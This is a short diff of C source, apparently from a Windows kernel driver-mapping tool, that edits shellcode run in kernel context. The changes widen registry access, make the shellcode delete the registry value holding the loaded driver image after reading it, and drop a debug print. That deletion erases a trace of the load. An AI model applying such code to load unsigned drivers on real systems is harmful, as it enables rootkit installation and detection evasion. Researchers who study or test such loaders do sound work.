@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.01
 *
-*  DATE:        12 Feb 2020
+*  DATE:        20 Apr 2020
 *
 *  Driver mapping routines.
 *
@@ -241,7 +241,7 @@ NTSTATUS NTAPI FakeDispatchRoutine(
         InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
 #endif
 
-        status = ShellCode->Import.ZwOpenKey(&hKey, KEY_READ, &obja);
+        status = ShellCode->Import.ZwOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
         if (NT_SUCCESS(status)) {
 
             str.Buffer = szValueKey;
@@ -260,6 +260,8 @@ NTSTATUS NTAPI FakeDispatchRoutine(
                     status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
                         (PVOID)pkeyinfo, returnLength, &dummy);
                     if (NT_SUCCESS(status)) {
+
+                        ShellCode->Import.ZwDeleteValueKey(hKey, &str);
 
                         Image = (ULONG_PTR)&pkeyinfo->Data[0];
                         dosh = (PIMAGE_DOS_HEADER)Image;
@@ -563,9 +565,13 @@ BOOL KDUSetupShellCode(
             (pfnZwQueryValueKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwQueryValueKey");
         ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwQueryValueKey);
 
-        g_ShellCode->Import.DbgPrint =
+        g_ShellCode->Import.ZwDeleteValueKey =
+            (pfnZwDeleteValueKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwDeleteValueKey");
+        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwDeleteValueKey);
+
+        /*g_ShellCode->Import.DbgPrint =
             (pfnDbgPrint)KDUResolveFunctionInternal(KernelBase, KernelImage, "DbgPrint");
-        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.DbgPrint);
+        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.DbgPrint);*/
 
 
         ProcedureSize = SizeOfProc((PBYTE)FakeDispatchRoutine);
@@ -577,6 +583,7 @@ BOOL KDUSetupShellCode(
         g_ShellCode->Import.ZwClose = &NtClose;
         g_ShellCode->Import.ZwOpenKey = &NtOpenKey;
         g_ShellCode->Import.ZwQueryValueKey = &NtQueryValueKey;
+        g_ShellCode->Import.ZwDeleteValueKey = &NtDeleteValueKey;
         g_ShellCode->Import.ExAllocatePool = &ExAllocatePoolTest;
         g_ShellCode->Import.ExFreePool = &ExFreePoolTest;
         g_ShellCode->Import.IofCompleteRequest = &IofCompleteRequestTest;
